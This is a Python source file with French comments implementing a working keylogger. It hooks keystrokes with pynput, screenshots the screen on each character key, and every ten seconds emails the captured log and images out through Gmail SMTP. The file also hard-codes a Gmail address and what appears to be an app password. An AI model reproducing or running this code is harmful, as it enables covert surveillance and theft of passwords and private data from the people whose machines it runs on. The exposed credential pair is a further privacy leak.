from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import time
#import keyboard as kb #pour les keylogs
from pynput import keyboard as kb
import smtplib 
#parceque on veut recovoir les keylogs par email
from threading import Timer 
#pour que les methodes s'executent apres une intervalle de temps
from datetime import timedelta, datetime
from email.mime.multipart import *
import pyscreenshot as ImageGrab
import os
########################################################

SEND_REPORT_EVERY= 10
EMAIL_ADDRESS="cimad1812@gmail.com" #changer avant d'executer
EMAIL_PASSWORD="bludaxhumqvtcoxb"
#l'envoi d'e-mails depuis des comptes Gmail 
#peut nécessiter des autorisations de sécurité supplémentaires de preference utiliser outlook
#######################################################3

#classe Keylogger
class Keylogger:
    def __init__(self,interval,report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log=""
        self.email=EMAIL_ADDRESS
        self.password=EMAIL_PASSWORD
        self.start_dt=datetime.now()
        self.end_dt=datetime.now() + timedelta(seconds=SEND_REPORT_EVERY)
        self.photos=0

#fonction pour capturer les touches pressées
    def callback(self, key):
        try:
            self.log += str(key.char)
            img = ImageGrab.grab()
            img.save(str(self.photos)+".png")
            self.photos+=1
        except AttributeError:
            if key == kb.Key.space:
                self.log += " "
            else:
                self.log += " "+str(key)+" "
        print(self.log)
        #print(self.photos)
        #self.photos[0].show()
        
        
##La méthode callback est appelée chaque 
#fois qu'une touche est pressée, 
#elle ajoute la touche à la variable self.log.



#fonction pour envoyer le rapport par email
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    #fonction pour envoyer le rapport à chaque intervalle de temps
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.report_method(self.email, self.password, self.log,self.photos)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
##La méthode report est appelée toutes les SEND_REPORT_EVERY secondes,
#elle envoie le rapport par email en appelant la méthode sendmail


    #fonction pour démarrer le keylogger
    def start(self):
        kb_listener = kb.Listener(on_press=self.callback)
        kb_listener.start()
        self.report()
        while True:
           time.sleep(1)

#fonction pour envoyer le rapport par email
def send_email(email, password, message,photos):
    
    msg = MIMEMultipart()
    #msgAlternative = MIMEMultipart('alternative')
    #msg.attach(msgAlternative)
    
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Keylogger report"
    msg.attach(MIMEText(message, 'plain'))
    #for img in photos:
    
    
    for index in range(0,photos):
        message += '<p><img src="cid:%s"></p>' % index
        with open('./'+str(index)+'.png',"rb") as fb:
            msgImage = MIMEImage(fb.read())
        # Define the image's ID in header
        msgImage.add_header('Content-ID', '<%s>' % index)
        # attach it to root
        msg.attach(msgImage)
        #os.remove('./'+str(index)+'.png')
    
    server = smtplib.SMTP(host='smtp.gmail.com', port=587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, email, text)
    print("Message has been sent.")
    server.quit()

#démarrer le keylogger
keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method=send_email)
keylogger.start()
